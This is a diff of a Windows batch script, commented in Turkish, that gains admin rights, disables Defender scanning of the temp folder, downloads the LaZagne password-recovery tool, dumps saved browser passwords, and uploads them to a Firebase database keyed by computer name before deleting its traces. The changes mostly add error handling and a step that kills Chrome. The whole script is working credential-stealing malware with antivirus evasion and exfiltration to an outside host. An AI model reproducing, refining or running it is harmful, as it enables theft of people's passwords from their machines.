@@ -2,79 +2,112 @@
 :: Step 1: Yönetici kontrolü
 net session >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [+] Bu scriptin çalışması için yönetici izni gerekiyor!
-    echo Lütfen scripti yönetici olarak çalıştırın.
+    echo [+] Bu scriptin calismasi icin yonetici izni gerekiyor!
+    echo Lutfen scripti yonetici olarak calistirin.
     pause
-    exit
+    exit /b 1
 )
 
-:: Step 2: Log dosyası oluştur
+:: Step 2: Log dosyasi olustur
 set LOGFILE=%TEMP%\browser_steal_log.txt
-echo [%DATE% %TIME%] Script başlatıldı > "%LOGFILE%"
+echo [%DATE% %TIME%] Script baslatildi >> "%LOGFILE%"
+echo [+] Script baslatildi...
 
-:: Step 3: Çalışma dizinine geç
+:: Step 3: Chrome'u kapat
+echo [%DATE% %TIME%] Chrome kapatiliyor... >> "%LOGFILE%"
+echo [+] Chrome kapatiliyor...
+taskkill /F /IM chrome.exe >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo [%DATE% %TIME%] UYARI: Chrome kapatilamadi, zaten calismiyor olabilir. >> "%LOGFILE%"
+    echo [+] UYARI: Chrome kapatilamadi, devam ediliyor...
+)
+
+:: Step 4: Calisma dizinine gec
 cd /d %TEMP%
-echo [%DATE% %TIME%] Çalışma dizini: %CD% >> "%LOGFILE%"
+if %ERRORLEVEL% neq 0 (
+    echo [%DATE% %TIME%] HATA: TEMP dizinine gecilemedi! >> "%LOGFILE%"
+    echo [+] HATA: TEMP dizinine gecilemedi!
+    pause
+    exit /b 1
+)
+echo [%DATE% %TIME%] Calisma dizini: %CD% >> "%LOGFILE%"
+echo [+] Calisma dizini: %CD%
 
-:: Step 4: Eski dosyaları sil
+:: Step 5: Eski dosyalari sil
 if exist lazagne.exe (
     echo [%DATE% %TIME%] Eski lazagne.exe siliniyor... >> "%LOGFILE%"
+    echo [+] Eski lazagne.exe siliniyor...
     del /f /q lazagne.exe >nul 2>&1
 )
 if exist results (
-    echo [%DATE% %TIME%] Eski results klasörü siliniyor... >> "%LOGFILE%"
+    echo [%DATE% %TIME%] Eski results klasoru siliniyor... >> "%LOGFILE%"
+    echo [+] Eski results klasoru siliniyor...
     rd /s /q results >nul 2>&1
 )
 
-:: Step 5: Defender исключение ekle (minimal)
-echo [%DATE% %TIME%] Defender için исключение ekleniyor... >> "%LOGFILE%"
+:: Step 6: Defender istisna ekle
+echo [%DATE% %TIME%] Defender icin istisna ekleniyor... >> "%LOGFILE%"
+echo [+] Defender icin istisna ekleniyor...
 powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'lazagne.exe' -ExclusionExtension 'exe'" >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo [%DATE% %TIME%] UYARI: Defender istisna eklenemedi, devam ediliyor... >> "%LOGFILE%"
+    echo [+] UYARI: Defender istisna eklenemedi, devam ediliyor...
+)
 
-:: Step 6: Lazagne indir
+:: Step 7: Lazagne indir
 echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
+echo [+] Lazagne indiriliyor...
 curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [%DATE% %TIME%] HATA: Curl indirme başarısız, PowerShell ile deneniyor... >> "%LOGFILE%"
-    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+    echo [%DATE% %TIME%] HATA: Curl indirme basarisiz, PowerShell ile deneniyor... >> "%LOGFILE%"
+    echo [+] HATA: Curl indirme basarisiz, PowerShell ile deneniyor...
+    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
     if %ERRORLEVEL% neq 0 (
-        echo [%DATE% %TIME%] HATA: PowerShell indirme de başarısız! >> "%LOGFILE%"
-        echo [+] Dosya indirilemedi, lütfen internet bağlantısını kontrol edin.
-        goto :cleanup
+        echo [%DATE% %TIME%] HATA: PowerShell indirme de basarisiz! >> "%LOGFILE%"
+        echo [+] HATA: Dosya indirilemedi, lutfen internet baglantisini kontrol edin.
+        pause
+        exit /b 1
     )
 )
 
-:: Step 7: lazagne.exe dosyasını kontrol et
+:: Step 8: lazagne.exe dosyasini kontrol et
 if exist lazagne.exe (
     for %%F in (lazagne.exe) do (
         if %%~zF LSS 1000 (
-            echo [%DATE% %TIME%] HATA: lazagne.exe bozuk veya boş (%%~zF bayt)! >> "%LOGFILE%"
+            echo [%DATE% %TIME%] HATA: lazagne.exe bozuk veya bos (%%~zF bayt)! >> "%LOGFILE%"
+            echo [+] HATA: lazagne.exe bozuk, lutfen tekrar deneyin.
             del /f /q lazagne.exe >nul 2>&1
-            echo [+] lazagne.exe bozuk, lütfen tekrar deneyin.
-            goto :cleanup
+            pause
+            exit /b 1
         )
     )
-    echo [%DATE% %TIME%] lazagne.exe başarıyla indirildi. >> "%LOGFILE%"
+    echo [%DATE% %TIME%] lazagne.exe basariyla indirildi. >> "%LOGFILE%"
+    echo [+] lazagne.exe basariyla indirildi.
 ) else (
     echo [%DATE% %TIME%] HATA: lazagne.exe indirilemedi! >> "%LOGFILE%"
-    echo [+] lazagne.exe indirilemedi, lütfen bağlantıyı kontrol edin.
-    goto :cleanup
+    echo [+] HATA: lazagne.exe indirilemedi, lutfen baglantiyi kontrol edin.
+    pause
+    exit /b 1
 )
 
-:: Step 8: Şifreleri topla
-echo [%DATE% %TIME%] Şifreler toplanıyor... >> "%LOGFILE%"
+:: Step 9: Sifreleri topla
+echo [%DATE% %TIME%] Sifreler toplanıyor... >> "%LOGFILE%"
+echo [+] Sifreler toplanıyor...
 lazagne.exe browsers -oN -output results >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [%DATE% %TIME%] HATA: lazagne.exe çalıştırılamadı! >> "%LOGFILE%"
-    echo [+] Şifre toplama başarısız, lütfen dosyayı kontrol edin.
-    goto :cleanup
+    echo [%DATE% %TIME%] HATA: lazagne.exe calistirilamadi! >> "%LOGFILE%"
+    echo [+] HATA: Sifre toplama basarisiz, lutfen dosyayi kontrol edin.
+    pause
+    exit /b 1
 )
 
-:: Step 9: Firebase’e veri gönder
+:: Step 10: Firebase’e veri gonder
 set LOGFILE=results\browsers.txt
 set DATA=
 
 if exist "%LOGFILE%" (
-    echo [%DATE% %TIME%] browsers.txt bulundu, işleniyor... >> "%LOGFILE%"
+    echo [%DATE% %TIME%] browsers.txt bulundu, isleniyor... >> "%LOGFILE%"
+    echo [+] browsers.txt bulundu, isleniyor...
     setlocal EnableDelayedExpansion
     for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
         set "line=%%A"
@@ -89,29 +122,33 @@ if exist "%LOGFILE%" (
     )
     endlocal & set DATA=%DATA%
 ) else (
-    echo [%DATE% %TIME%] HATA: browsers.txt bulunamadı! >> "%LOGFILE%"
+    echo [%DATE% %TIME%] HATA: browsers.txt bulunamadi! >> "%LOGFILE%"
+    echo [+] HATA: browsers.txt bulunamadi, NoDataCollected gonderiliyor...
     set DATA=NoDataCollected
 )
 
 :: Firebase URL with /credentials/%COMPUTERNAME%
 set FB=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json
 echo [%DATE% %TIME%] Firebase URL: %FB% >> "%LOGFILE%"
+echo [+] Firebase URL: %FB%
 
-echo [%DATE% %TIME%] Firebase’e veri gönderiliyor... >> "%LOGFILE%"
+echo [%DATE% %TIME%] Firebase’e veri gonderiliyor... >> "%LOGFILE%"
+echo [+] Firebase’e veri gonderiliyor...
 powershell -Command ^
-  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gönderim başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gonderim basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [%DATE% %TIME%] HATA: Firebase gönderim başarısız! >> "%LOGFILE%"
-    echo [+] Firebase’e veri gönderilemedi, log dosyasını kontrol edin.
+    echo [%DATE% %TIME%] HATA: Firebase gonderim basarisiz! >> "%LOGFILE%"
+    echo [+] HATA: Firebase’e veri gonderilemedi, log dosyasini kontrol edin.
 )
 
-:: Step 10: Temizlik
+:: Step 11: Temizlik
 :cleanup
-echo [%DATE% %TIME%] Temizlik yapılıyor... >> "%LOGFILE%"
+echo [%DATE% %TIME%] Temizlik yapiliyor... >> "%LOGFILE%"
+echo [+] Temizlik yapiliyor...
 if exist lazagne.exe del /f /q lazagne.exe >nul 2>&1
 if exist results rd /s /q results >nul 2>&1
 
-echo [%DATE% %TIME%] İşlem tamamlandı, çıkılıyor... >> "%LOGFILE%"
-echo [+] İşlem tamamlandı, çıkılıyor...
-timeout /t 3 >nul
-exit
+echo [%DATE% %TIME%] Islem tamamlandi, cikiliyor... >> "%LOGFILE%"
+echo [+] Islem tamamlandi, cikiliyor...
+pause
+exit /b 0
